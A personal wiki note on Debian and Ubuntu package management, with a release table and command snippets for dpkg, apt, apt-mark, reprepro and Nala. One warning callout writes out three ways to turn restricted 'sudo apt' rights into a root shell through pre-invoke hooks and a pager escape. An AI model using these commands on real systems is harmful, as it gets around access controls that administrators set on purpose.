---
tags:
  - linux
  - linux/Debian
  - linux/Ubuntu
visibility: public
title: Debian
---
# Debian

## Distros

|           | Codename   | Release    | End-of-life |
| --------- | ---------- | ---------- | ----------- |
| Debian 12 | [bookworm] | 2023-06-10 |             |
| Debian 11 | [bullseye] | 2021-08-14 |             |
|           |            |            |             |

## Repositories and Packages

<https://wiki.debian.org/DebianRepository/UseThirdParty>

[Package debfoster](https://packages.debian.org/stretch/debfoster) ^272991
> wrapper program for apt and dpkg. When first run, it will ask you which of the installed packages you want to keep installed.
> After that, it maintains a list of packages that you want to have installed on your system. It uses this list to detect packages that have been installed only because other packages depended on them. If one of these dependencies changes, debfoster will take notice, and ask if you want to remove the old package.
> This helps you to maintain a clean Debian install, without old (mainly library) packages lying around that aren't used any more.

- Ubuntu 22 changed the required compression for packages. In case of an improperly archived package it might have to be extracted and re-packaged or the proper format requested from the package maintainers.


### dpkg

```bash
## extract package
dpkg -x [-X] <package> <destination>
## compare package versions
dpkg --compare-versions $version1 ne $version2
```

### apt

Tags: #linux/apt

```bash
# Add repository: add file in `/etc/apt/sources.list.d/` with
# deb [arch=amd64 signed-by=/usr/share/keyrings/<keyring>] <url> <repository-name> main

# Install specific version
sudo apt install package_name=package_version
# empty cache (downloaded packages) [Foss](https://itsfoss.com/clear-apt-cache/)
apt-get clean
```

> [!warning]- `sudo apt` vulnerability/exploit to get a root shell
> #tech/vulnerability #tech/exploit [permission escalation with `sudo apt`](https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/) ^9f90c9
>
> ```bash
> # Method 1: apt-get update pre-invoke shell
> sudo apt-get update -o APT::Update::Pre-Invoke::= /bin/bash
> # Method 2: start shell from interactive apt-get changelog
> sudo apt-get changelog apt << '#!/bin/sh'
> # Method 3: apt install pre-invoke shell (from file)
> TF=$(mktemp)
>  echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF
>  sudo apt-get install -c $TF sl
> ```

- [apt-fast](https://github.com/ilikenwf/apt-fast) (unofficial package): shellscript wrapper for apt-get and aptitude that can drastically improve apt download times by downloading packages in parallel, with multiple connections per package


#### Packages

Pin/hold a package version, for example Kernel version (see [Work notes LWP > Puppet > module Kernel Maintenance](obsidian://vault/lwp-docs/lwp/Puppet/modules/kernel_maintenance) and [code](file://git/puppetserver/our-modules/kernel_maintenance/manifests/init.pp))

```bash
apt-mark showhold | grep -q -e '^linux-headers-${pin}' -e '^linux-image-${pin}' -e '^linux-modules-${pin}' -e '^linux-modules-extra-${pin}'
apt-mark hold linux-headers-${pin}-generic linux-image-${pin}-generic linux-modules-${pin}-generic linux-modules-extra-${pin}-generic
```


#### reprepro

`reprepro`: produce, manage and sync a local repository of Debian packages

See also [RUG: Jurjen's notes on Debian packages].

```bash
## add package to repository
sudo reprepro \
    --confdir /etc/wraprepro/vhosts.d/<domain>/<mirror>/<os>/<release>/conf/ \
    includedeb <repository-name> \
    <package>
## test what packages would be pulled to target channel
sudo reprepro \
     --confdir /etc/wraprepro/vhosts.d/<domain>/<mirror>/<os>/<release>/conf/ \
     checkpull <target-repository-name>
## actually pull changes to target channel: replace checkpull by pull
```


#### Nala

[Github](https://github.com/volitank/nala) | [Wiki](https://gitlab.com/volian/nala/-/wikis/Installation)
> Nala is a front-end for `libapt-pkg`. Specifically we interface using the `python-apt` api.
![|400](https://github.com/volitank/nala/raw/main/imgs/nala-install-2.png)
<https://trendoceans.com/nala-package-manager/>


### References

- [Debian Live Manual][deb-live]
- [Build Debian live image, blog post][blog-live-build]

[deb-live]: <https://live-team.pages.debian.net/live-manual/html/live-manual/toc.en.html>
[blog-live-build]: <https://dquinton.github.io/debian-install/netinstall/live-build.html>
[bullseye]: <https://www.debian.org/releases/bullseye/>
[bookworm]: <https://www.debian.org/releases/bookworm/>
